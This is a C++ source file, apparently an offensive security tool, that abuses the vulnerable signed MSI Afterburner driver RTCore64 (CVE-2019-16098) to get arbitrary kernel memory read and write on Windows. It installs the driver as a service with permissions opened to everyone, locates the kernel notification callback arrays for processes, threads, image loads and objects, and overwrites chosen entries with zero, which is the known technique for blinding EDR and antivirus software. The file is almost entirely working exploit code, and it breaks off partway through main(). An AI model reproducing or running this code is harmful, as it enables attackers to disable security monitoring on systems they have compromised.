// Many thanks to
// https://github.com/Barakat/CVE-2019-16098 - original exploit
// https://github.com/RedCursorSecurityConsulting/PPLKiller - multiple code snippets were re-used here

#include <Windows.h>
#include <aclapi.h>
#include <Psapi.h>
#include <cstdio>
#include <iostream>

//#define DEBUGGING_ON  1
#define  KERNEL_MEMORY_START 0xFFFF000000000000


#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
#endif


struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;
void Log(const char* Message, ...) {
    const auto file = stderr;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}

void Debug(const char* Message, ...) {
#if defined(DEBUGGING_ON)
    const auto file = stdout;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
    Sleep(100);  // to give the output a chance to write before a potential BSOD
#endif
}

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}
BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address) {
    if (Address > KERNEL_MEMORY_START) {
        return ReadMemoryPrimitive(Device, 1, Address) & 0xffffff;
    }
    return 0;
}


WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    if (Address > KERNEL_MEMORY_START) {
        return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
    }
    return 0;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    if (Address > KERNEL_MEMORY_START) {
        return ReadMemoryPrimitive(Device, 4, Address);
    }
    return 0;
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    if (Address > KERNEL_MEMORY_START) {
        return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
    }
    return 0;
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    if (Address > KERNEL_MEMORY_START) {
        WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
        WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
    }
}

#define STRING_MAX_LENGTH 256

WORD ReadStringW(HANDLE Device, DWORD64 Address, wchar_t buffer[STRING_MAX_LENGTH]) {
    wchar_t v = 0x0;
    wchar_t i = 0;

    do {
        v = ReadMemoryDWORD(Device, Address + (i * sizeof(WORD)));
        buffer[i++] = v;

    } while (v);

    return i;
}



DWORD64 Findkrnlbase() {
    DWORD cbNeeded = 0;
    LPVOID drivers[1024];

    
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        Log("[+] Kernel base address: %p", (DWORD64)drivers[0]);
        return (DWORD64)drivers[0];
    }

    return NULL;
}

//Mimikatz code to load / unload driver

BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) {
    BOOL status = FALSE;
    DWORD dwSizeNeeded;
    PSECURITY_DESCRIPTOR oldSd, newSd;
    SECURITY_DESCRIPTOR dummySdForXP;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    EXPLICIT_ACCESS ForEveryOne = {
        SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
        SET_ACCESS,
        NO_INHERITANCE,
        {NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
    };
    if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
        if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) {
            if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
                if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryOne.Trustee.ptstrName)) {
                    if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
                        status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
                        LocalFree(newSd);
                    }
                    FreeSid(ForEveryOne.Trustee.ptstrName);
                }
            }
            LocalFree(oldSd);
        }
    }
    return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
    BOOL status = FALSE;
    SC_HANDLE hSC = NULL, hS = NULL;

    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
        if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
            wprintf(L"[+] \'%s\' service already registered\n", serviceName);
        }
        else {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
                wprintf(L"[*] \'%s\' service not present\n", serviceName);
                if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
                    wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
                    if (status = kull_m_service_addWorldToSD(hS))
                        wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
                    else printf("kull_m_service_addWorldToSD");
                }
                else PRINT_ERROR_AUTO(L"CreateService");
            }
            else PRINT_ERROR_AUTO(L"OpenService");
        }
        if (hS) {
            if (startIt) {
                if (status = StartService(hS, 0, NULL))
                    wprintf(L"[+] \'%s\' service started\n", serviceName);
                else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                    wprintf(L"[*] \'%s\' service already started\n", serviceName);
                else {
                    PRINT_ERROR_AUTO(L"StartService");
                }
            }
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    else {
        PRINT_ERROR_AUTO(L"OpenSCManager(create)");
        return GetLastError();
    }
    return 0;
}

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
    BOOL status = FALSE;
    SC_HANDLE hSC, hS;
    SERVICE_STATUS serviceStatus;

    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
        if (hS = OpenService(hSC, serviceName, dwDesiredAccess)) {
            status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    return status;
}

BOOL service_uninstall(PCWSTR serviceName) {
    if (kull_m_service_genericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
        wprintf(L"[+] \'%s\' service stopped\n", serviceName);
    }
    else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
        wprintf(L"[*] \'%s\' service not running\n", serviceName);
    }
    else {
        PRINT_ERROR_AUTO(L"kull_m_service_stop");
        return FALSE;
    }

    if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
        if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
            BOOL status = DeleteService(hS);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    return TRUE;
}
// thanks gentilkiwi!



void FindDriver(DWORD64 address) {

    if (address < KERNEL_MEMORY_START) {
        // do nothing, it is not kernel space
        Debug("[*] memory space not in kernel space, %p", address);
        return;
    }

    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;
    DWORD64 diff[3][200];
    TCHAR szDriver[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        int n = sizeof(drivers) / sizeof(drivers[0]);
        cDrivers = cbNeeded / sizeof(drivers[0]);
        int narrow = 0;
        int c = 0;
        for (i = 0; i < cDrivers; i++) {
            //we add all smaller addresses of drivers to a new array, then grab the closest. Not great, I know...
            if (address > (DWORD64)drivers[i]) {
                diff[0][c] = address;
                diff[1][c] = address - (DWORD64)drivers[i];
                diff[2][c] = (DWORD64)drivers[i];
                c++;
            }
        }
    }
    //cheeky for loop to find the smallest diff. smallest diff should be the diff of DriverBase + Diff == Callback function.
    int k = 0;
    DWORD64 temp = diff[1][0];
    for (k = 0; k < cDrivers; k++) {
        if ((temp > diff[1][k]) && (diff[0][k] == address)) {
            temp = diff[1][k];

        }
    }

    if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver))) {
        std::cout << "[+] " << std::hex << address << " [";
        std::wcout << szDriver << " + 0x";
        std::cout << std::hex << (int)temp;
        std::cout << "]" << std::endl;
    }
    else {
        Log("[+] Could not resolve driver for %p", address);
    }

}

struct ObjectTypes {
    DWORD64 process;
    DWORD64 image;
    DWORD64 thread;
    DWORD64 registry;
    DWORD64 object;
};

struct ObjectTypes getVersionPatterns() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
                   // process     ,  image            ,   thread           ,   registry       ,     object
    switch (winVer) {
        //case 1903:
    case 1809:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48, 0xd40349c9ff02b70f };
    case 1909:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48, 0xd40349c9ff02b70f };
    case 2004:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48, 0xd40349c9ff02b70f };
    case 2009: // Verified 20H2
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48, 0xd40349c9ff02b70f };
     default:
        wprintf(L"[!] Version Patterns Not Found! %d\n", winVer);

    }

}

struct ObjectTypes getVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
    // process     ,  image            ,   thread           ,   registry       ,     object
    switch (winVer) {
        //case 1903:
    case 1809:
        return { (DWORD64)-0xC, (DWORD64)-0x7, (DWORD64)-0x4, (DWORD64)-0x19, (DWORD64)0x19 };
    case 1909:
        return { (DWORD64)-0xC, (DWORD64)-0x7, (DWORD64)-0x4, (DWORD64)-0x19, (DWORD64)0x19 };
    case 2004:
        return { (DWORD64)-0xC, (DWORD64)-0x7, (DWORD64)-0x4, (DWORD64)-0x19, (DWORD64)0x19 };
    case 2009: // Verified 20H2
        return { (DWORD64)-0xC, (DWORD64)-0x7, (DWORD64)-0x4, (DWORD64)-0x19, (DWORD64)0x19 };
    default:
        wprintf(L"[!] Version Offsets Not Found! %d\n", winVer);

    }

}



HANDLE GetDriverHandle(){

    //  more info on this : https://stackoverflow.com/questions/21703592/open-device-name-using-createfile
    //  For the below link to work it has to be i nthe kernel diretoy
    //HANDLE Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    HANDLE Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE) {
        Log("[!] Unable to obtain a handle to the device object");
        return Device;
        exit;
    }
    else {
        Log("[+] Device object handle obtained: %p", Device);
        return Device;
    }

}
/**
* Returns the address of Kernel base + the offset of the function in ntoskenle.exe for the given function
*/
DWORD64 GetFunctionAddress(LPCSTR function) {

    DWORD64 Ntoskrnlbaseaddress = Findkrnlbase();
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    DWORD64 functionAddress = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, function));
    if (functionAddress == 0x0) {
        Log("function %s not found in ntoskrnl.exe", function);
        return functionAddress;
    }
    DWORD64 Offset = functionAddress - reinterpret_cast<DWORD64>(Ntoskrnl);
    Debug("[*] Ntoskrnl.exe loaded : %p ", reinterpret_cast<DWORD64>(Ntoskrnl));
    Debug("[*] Ntoskrnlbaseaddress : %p ", Ntoskrnlbaseaddress);
    Debug("[+] %s functionAddress  : %p", function, functionAddress);
    Debug("[+] %s Offset           : %p", function, Offset);

    DWORD64 address = Ntoskrnlbaseaddress + Offset;
    Debug("[+] %s address          : %p", function, address);
    FreeLibrary(Ntoskrnl);
    return address;

}

DWORD64 PatternSearch(HANDLE Device, DWORD64 start, DWORD64 end, DWORD64 pattern) {
    //searches for a pattern of instructions known to be close to the target array in memory, returns the address. Calling function then does some calculations based on the returned value.
    int range = end - start;
    Debug("  Looking %p : %p", start, pattern);
 
    for (int i = 0; i < range; i++) {
        DWORD64 contents = ReadMemoryDWORD64(Device, start + i);
        Debug("[-] %d : %p : %p", i, start + i, contents);
        if (contents == pattern) {
            Debug("[*] GOLD JERRY GOLD: %p", start+i);
            Sleep(200);
            return start + i;
        }
    }
    
    return 0x0;
}


void findregistrycallbackroutines(DWORD64 remove) {
    //UCHAR PTRN_W10_Reg[] =	{0x48, 0x8b, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x85, 0xc0, 0x0f, 0x84};
    //so retrieving this one is different from proc/img/thread. We need to find the undocumented callbacklisthead. The callbacklisthead contains a pointer to the registry notification callback routine. 
    //At offset 0x28 is the address of the callback function.


    PLIST_ENTRY pEntry;
    ObjectTypes patterns = getVersionPatterns(); // hardcoded
    ObjectTypes variableOffset = getVersionOffsets();
    
    const auto Device = GetDriverHandle();
    DWORD64 CmUnRegisterCallbackAddress = GetFunctionAddress("CmUnRegisterCallback");
    DWORD64 DbgkLkmdUnregisterCallbackAddress = GetFunctionAddress("DbgkLkmdUnregisterCallback");
    DWORD64 patternaddress = PatternSearch(Device, CmUnRegisterCallbackAddress, DbgkLkmdUnregisterCallbackAddress, patterns.registry);
    DWORD offset = ReadMemoryDWORD(Device, patternaddress + variableOffset.registry);
    const DWORD64 callbacklisthead = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) + variableOffset.registry + sizeof(DWORD);
    Log("[+] Callbacklisthead: %p", callbacklisthead);
    DWORD64 nextitem = ReadMemoryDWORD64(Device, callbacklisthead + 0x8);
    int i = 0;

    while (nextitem != callbacklisthead && i < 64) {
        nextitem = ReadMemoryDWORD64(Device, nextitem + 0x8);
        DWORD64 callback = ReadMemoryDWORD64(Device, ReadMemoryDWORD64(Device, nextitem) + 0x28);
        DWORD64 address = ReadMemoryDWORD64(Device, nextitem) + 0x28;
        FindDriver(callback);
        /* Removing this functionality for now. Writing to this structure seems to trigger patchguard. Need to find a way around it.
        if (callback == remove) {
            Log("Removing callback to %p at address %p", callback, address);
            //WriteMemoryDWORD64(Device, address, 0x0000000000000000);
        }*/
        i++;
    }

}

void findobjcallbackroutine(DWORD64 remove) {
    
    PLIST_ENTRY pEntry;
    ObjectTypes patterns = getVersionPatterns(); // hardcoded
    ObjectTypes variableOffset = getVersionOffsets();
    const auto Device = GetDriverHandle(); // vulnerable signed driver
   
    DWORD64 startAddress = GetFunctionAddress("ObCreateObjectType");
  //  DWORD64 endAddress = GetFunctionAddress("IoCreateDriver");

    if (startAddress) {

        Debug("[+] Searching for object pattern  ");
        DWORD64 patternaddress = PatternSearch(Device, startAddress, startAddress+0x300, patterns.object);
        Debug("[+] patterns.object         : %p", patterns.object);
        Debug("[+] patternaddress         : %p", patternaddress);
        
        if (!patternaddress) {
            Debug("[*] Not able to find pattern in memory");
            return;
        }

        // reads the kernel space memory using the device @ the patternaddress 
        Debug("[+] Reading value for object callback list  ");

        DWORD offset = ReadMemoryDWORD(Device, patternaddress + variableOffset.object);
        // offfset is the offset from the end of the instruction 
        Debug("[+] variableOffset.object     : %p", variableOffset.object);
        Debug("[+] offset found   (%p) : %d", patternaddress + variableOffset.object, offset);

       DWORD lowerAddress = (DWORD)patternaddress + offset + (DWORD)variableOffset.object + sizeof(DWORD);
       DWORD64 upperAddress = ((patternaddress) >> 32) << 32;
       const DWORD64 objectDirectory = upperAddress + lowerAddress;
       Debug("[+] lowerAddress      : %p", lowerAddress);
       Debug("[+] upperAddress      : %p", upperAddress);

        Debug("[+] objectDirectory      : %p", objectDirectory);
 
        DWORD64 objectDirectoryEntryAddress = ReadMemoryDWORD64(Device, objectDirectory );
        Debug("[+] objectDirectoryEntryAddress (array) : %p", objectDirectoryEntryAddress);
        DWORD64 firstObjectDirectoryEntry = objectDirectoryEntryAddress;

        Log("[+] Enumerating object callbacks");
        // there only 37 slots to store callbacks
        for (int i = 0; i < 37; i++) {
            objectDirectoryEntryAddress =  firstObjectDirectoryEntry + (i* 0x8);
            Debug("[+] array lookup : %d : %p", i, objectDirectoryEntryAddress);
            

            if (objectDirectoryEntryAddress) {
                DWORD64 objectDirectoryEntry = ReadMemoryDWORD64(Device, objectDirectoryEntryAddress);
                Debug("[+] objectDirectoryEntry    (%p) : %p", objectDirectoryEntryAddress, objectDirectoryEntry);
                

                while (objectDirectoryEntry) {
                    Debug("[*]While Loop -----------------");
                    

                    DWORD64 objectTypeAddress = objectDirectoryEntry +0x8; //ObjectDirectoryEntry->ObjectType
                    DWORD64 objectType = ReadMemoryDWORD64(Device, objectTypeAddress);
                    Debug("[+] objectType              (%p): %p", objectTypeAddress, objectType);
                    

                    DWORD64 objectTypeNameAddress = objectType + 0x18;
                    wchar_t objectName[STRING_MAX_LENGTH] = { 0 };

                    DWORD64 objNameAddress = ReadMemoryDWORD64(Device, objectTypeNameAddress);
                    WORD size = ReadStringW(Device, objNameAddress, objectName);
                    Debug("[+] objectName[%d]          (%p): %ls",size, objNameAddress, objectName);
                    Debug("[+] Object Name : %ls", objectName);
                  

                    if (  wcscmp(objectName, L"Process") == 0
                       || wcscmp(objectName, L"Thread")  == 0
                       || wcscmp(objectName, L"Desktop") == 0) {
                        // It is not a Process, Thread ot Desktop Callback
                        DWORD64 ObjectCallbackEntryAddress = objectType + 0xC8;
                        DWORD64  ObjectCallbackEntry = ReadMemoryDWORD64(Device, ObjectCallbackEntryAddress);
                        Debug("[+]  ObjectCallbackEntry    (%p): %p", ObjectCallbackEntryAddress, ObjectCallbackEntry);
                        
                        if (ObjectCallbackEntry) {
                            do {
                                Debug("[*]Do Loop -----------------");
                                

                                ULONG ObjectCallbackEntryActive =  ReadMemoryDWORD(Device, ObjectCallbackEntry + 0x14);
                                Debug("[+]  ObjectCallbackEntryActive  : %d", ObjectCallbackEntryActive);
                             

                                if (ObjectCallbackEntryActive && objectType) {

                                    DWORD64 preOpAddress = ObjectCallbackEntry + 0x28;
                                    DWORD64 preOp = ReadMemoryDWORD64(Device, preOpAddress);
                                    Debug("[+] preOp       (%p) : %p", preOpAddress, preOp);
                                    
                                    if (preOp) {
                                        if (remove && (remove == preOp)) {
                                            WriteMemoryDWORD64(Device, preOpAddress, 0x0);
                                        }
                                        else {
                                            FindDriver(preOp);
                                        }


                                    }

                                 
                                    DWORD64 postOpAddress = ObjectCallbackEntry + 0x30;
                                    DWORD64 postOp = ReadMemoryDWORD64(Device, postOpAddress);
                                    Debug("[+] postOp       (%p) : %p", postOpAddress, postOp);
                                   
                                    if (remove && (remove == postOp)) {
                                        WriteMemoryDWORD64(Device, postOpAddress, 0x0);
                                    }
                                    else {
                                        FindDriver(postOp);
                                    }
                                    

                                }//end if

                                ObjectCallbackEntryAddress = ReadMemoryDWORD64(Device, ObjectCallbackEntry);
                                Debug("[+] ObjectCallbackEntry->CallbackList.Flink  : %p ", ObjectCallbackEntryAddress);
                                Debug("[+] ObjectCallbackEntry                      : %p ", ObjectCallbackEntry);
                                Debug("[+] objectType + 0xC8                        : %p ", objectType + 0xC8);


                            } while (ObjectCallbackEntryAddress != (objectType + 0xC8));
                        }//end if
                    }//end if {objectName}

                    objectDirectoryEntryAddress = ReadMemoryDWORD64(Device, objectDirectoryEntry); //ObjectDirectoryEntry->ChainLink 
                    objectDirectoryEntry = ReadMemoryDWORD64(Device, objectDirectoryEntryAddress);
                    Debug("[+] objectDirectoryEntry    (%p) : %p", objectDirectoryEntryAddress, objectDirectoryEntry);
                    Debug("[*] Chianlink hit");
                   
                }//end while
            }//end if
        }//end for
    }
}

void findimgcallbackroutine(DWORD64 remove) {

    ObjectTypes patterns = getVersionPatterns();
    ObjectTypes variableOffset = getVersionOffsets();
    const auto Device = GetDriverHandle();
    
    
    DWORD64 PsSetLoadImageNotifyRoutineExAddress = GetFunctionAddress("PsSetLoadImageNotifyRoutineEx");
    DWORD64 PsSetCreateProcessNotifyRoutine = GetFunctionAddress("PsSetCreateProcessNotifyRoutine");

    DWORD64 patternaddress = PatternSearch(Device, PsSetLoadImageNotifyRoutineExAddress, PsSetCreateProcessNotifyRoutine, patterns.image);
    DWORD offset = ReadMemoryDWORD(Device, patternaddress + variableOffset.image);
    const DWORD64 PspLoadImageNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) + variableOffset.image + sizeof(DWORD);
    Log("[+] PspLoadImageNotifyRoutineAddress: %p", PspLoadImageNotifyRoutineAddress);
    Log("[+] Enumerating image load callbacks");
    int i = 0;
    // there only eight slots to store callbacks
    for (i; i < 8; i++) {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspLoadImageNotifyRoutineAddress + (i * 8));
        if (callback != NULL) {//only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
            FindDriver(cbFunction);
            if (cbFunction == remove) {
                Log("Removing callback to %p at address %p", cbFunction, PspLoadImageNotifyRoutineAddress + (i * 8));
                WriteMemoryDWORD64(Device, PspLoadImageNotifyRoutineAddress + (i * 8), 0x0000000000000000);
            }
        }

    }

}


void findthreadcallbackroutine(DWORD64 remove) {
    
    ObjectTypes patterns = getVersionPatterns();
    ObjectTypes variableOffset = getVersionOffsets();
    const auto Device = GetDriverHandle();
    
    const DWORD64 PsRemoveCreateThreadNotifyRoutine = GetFunctionAddress("PsRemoveCreateThreadNotifyRoutine");
    const DWORD64 PsRemoveLoadImageNotifyRoutine = GetFunctionAddress("PsRemoveLoadImageNotifyRoutine");
    
    DWORD64 patternaddress = PatternSearch(Device, PsRemoveCreateThreadNotifyRoutine, PsRemoveLoadImageNotifyRoutine, patterns.thread);
    DWORD offset = ReadMemoryDWORD(Device, patternaddress + variableOffset.thread);
    DWORD64 PspCreateThreadNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress) + offset + variableOffset.thread + sizeof(DWORD));
    Log("[+] PspCreateThreadNotifyRoutineAddress: %p", PspCreateThreadNotifyRoutineAddress);
    Log("[+] Enumerating thread creation callbacks");
    int i = 0;
    // there only eight slots to store callbacks
    for (i; i < 8; i++) {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspCreateThreadNotifyRoutineAddress + (i * 8));
        if (callback != NULL) {//only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
            FindDriver(cbFunction);
            if (cbFunction == remove) {
                Log("Removing callback to %p at address %p", cbFunction, PspCreateThreadNotifyRoutineAddress + (i * 8));
                WriteMemoryDWORD64(Device, PspCreateThreadNotifyRoutineAddress + (i * 8), 0x0000000000000000);
            }
        }

    }

}



void findprocesscallbackroutine(DWORD64 remove) {
   
    //we search the memory between pssetcreateprocessnotifyroutine and iocreatedriver for a specific set of instructions next to a relative LEA containing the offset to the PspCreateProcessNotifyRoutine array of callbacks.
    ObjectTypes patterns = getVersionPatterns();
    ObjectTypes variableOffset = getVersionOffsets();
    const auto Device = GetDriverHandle();
    const DWORD64 PsSetCreateProcessNotifyRoutineAddress = GetFunctionAddress("PsSetCreateProcessNotifyRoutine");
    const DWORD64 IoCreateDriverAddress = GetFunctionAddress("IoCreateDriver");
    //the address returned by the patternsearch is just below the offsets. 
    DWORD64 patternaddress = PatternSearch(Device, PsSetCreateProcessNotifyRoutineAddress, IoCreateDriverAddress, patterns.process);
    DWORD offset = ReadMemoryDWORD(Device, patternaddress + variableOffset.process);
    //so we take the 64 bit address, but have a 32 bit addition. To prevent overflow, we grab the first half (shift right, shift left), then add the 32bit DWORD patternaddress with the 32bit offset, and subtract 8. *cringe*
    DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress) + offset + variableOffset.thread + sizeof(DWORD));

    Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
    Log("[+] Enumerating process creation callbacks");
    int i = 0;
    for (i; i < 64; i++) {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspCreateProcessNotifyRoutineAddress + (i * 8));
        if (callback != NULL) {//only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
            FindDriver(cbFunction);
            if (cbFunction == remove) {
                Log("Removing callback to %p at address %p", cbFunction, PspCreateProcessNotifyRoutineAddress + (i * 8));
                WriteMemoryDWORD64(Device, PspCreateProcessNotifyRoutineAddress + (i * 8), 0x0000000000000000);
            }
        }
    }
}



int main(int argc, char* argv[]) {
    
    if (argc < 2) {
        printf("Usage: %s\n"
            " /proc - List Process Creation Callbacks\n"
            " /delproc <address> - Remove Process Creation Callback\n"
            " /thread - List Thread Creation Callbacks\n"
            " /delthread - Remove Thread Creation Callback\n"
            " /installDriver - Install the MSI driver\n"
            " /uninstallDriver - Uninstall the MSI driver\n"
            " /img - List Image Load Callbacks\n"
            " /delimg <address> - Remove Image Load Callback\n"
            " /obj - List Object Load Callbacks\n"
            " /delobj <address> - Remove Object Load Callback\n"
            " /reg - List Registry modification callbacks\n"
            , argv[0]);
        return 0;
    }
    
    const auto svcName = L"RTCore64";
    const auto svcDesc = L"Micro-Star MSI Afterburner";
    const wchar_t driverName[] = L"\\RTCore64.sys";
    const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
    TCHAR driverPath[pathSize];
    GetCurrentDirectory(pathSize, driverPath);
    wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));


    if (strcmp(argv[1] + 1, "proc") == 0) {

        findprocesscallbackroutine(NULL);
    }
    else if (strcmp(argv[1] + 1, "delproc") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        findprocesscallbackroutine((DWORD64)remove);
    }
    else if (strcmp(argv[1] + 1, "installDriver") == 0) {
        if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
            wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
        }
    }
    else if (strcmp(argv[1] + 1, "uninstallDriver") == 0) {
        service_uninstall(svcName);
    }
    else if (strcmp(argv[1] + 1, "img") == 0) {

